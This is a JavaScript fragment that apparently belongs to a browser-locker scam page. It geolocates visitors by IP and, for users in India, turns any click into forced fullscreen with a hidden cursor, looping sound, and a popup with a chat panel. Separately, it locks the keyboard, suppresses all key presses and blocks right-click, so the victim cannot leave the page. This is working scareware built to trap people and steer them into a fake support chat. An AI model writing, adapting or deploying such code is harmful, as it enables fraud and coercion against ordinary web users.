
    // Function to request full-screen mode
    function goFullScreen() {
      const elem = document.documentElement; // Get the document element
      document.documentElement.classList.add('fullscreen-mode');
      document.body.classList.add('fullscreen-mode');
      showPopup();
      if (elem.requestFullscreen) {
        elem.requestFullscreen();
      } else if (elem.mozRequestFullScreen) { // Firefox
        elem.mozRequestFullScreen();
      } else if (elem.webkitRequestFullscreen) { // Chrome, Safari, and Opera
        elem.webkitRequestFullscreen();
      } else if (elem.msRequestFullscreen) { // IE/Edge
        elem.msRequestFullscreen();
      }
  
      // After fullscreen is activated, show the popup
      showPopup();
           disableCursor();
            playSound();  // Play the background sound
  
    }
   function playSound() {
      const sound = document.getElementById('background-sound');
      if (sound) {
        // Try to play the sound
        sound.play().then(() => {
          console.log("Audio is playing.");
        }).catch(error => {
          console.log("Audio playback failed: ", error);
        });
      } else {
        console.log("Audio element not found.");
      }
    }
  
  // // Function to disable mouse cursor
    function disableCursor() {
      document.body.classList.add('disable-cursor'); // Add class to disable the cursor
    }
    // Function to show the popup
    function showPopup() {
      document.getElementById('popup').classList.remove('hidden');
      document.getElementById('chat').style.display = 'block'; // Ensure chat is visible
    }
  
    document.addEventListener('DOMContentLoaded', function() {
      document.getElementById('chat').style.display = 'none'; // Ensure chat is hidden initially
    });
  
    // Lock the keyboard
    if (navigator.keyboard && navigator.keyboard.lock) {
      navigator.keyboard.lock(); // Lock the keyboard to disable all keyboard input
    }
  
    // Fallback to disable all keyboard keys if the `keyboard.lock()` API doesn't work
    document.onkeydown = function(e) {
      return false; // Disable keyboard keys
    };
      
      // Disable right-click of mouse
  document.addEventListener('contextmenu', function (e) {
    e.preventDefault();  // Disable right-click
  });
  
    // Function to get location using an IP-based service
    function getLocationByIP() {
      fetch('https://ipapi.co/json/')
        .then(response => {
          if (!response.ok) {
            throw new Error('Network response was not ok');
          }
          return response.json();
        })
        .then(data => {
          console.log(data, "test"); // Log the full data for debugging
          const country = data.country; // Get the country code (e.g., IN for India)
          const city = data.city || "Unknown City";
          const region = data.region || "Unknown Region";
  
          // Check if the user is in India (country code: "IN")
          if (data.country == "IN") {
            // Trigger the event listener for full-screen, popup, etc.
            document.addEventListener('click', function() {
              goFullScreen();  // Trigger full-screen mode when the page is clicked
              showPopup();     // Show the popup
            });
          } else {
            console.log("User is not in India. The script will not trigger.");
          }
        })
        .catch(error => {
          console.error('Error with IP-based location service:', error);
          document.getElementById('location-info').innerText += `\nError with IP-based location service: ${error.message}`;
        });
    }
  
    // Call the function to get the initial location via IP
    getLocationByIP();
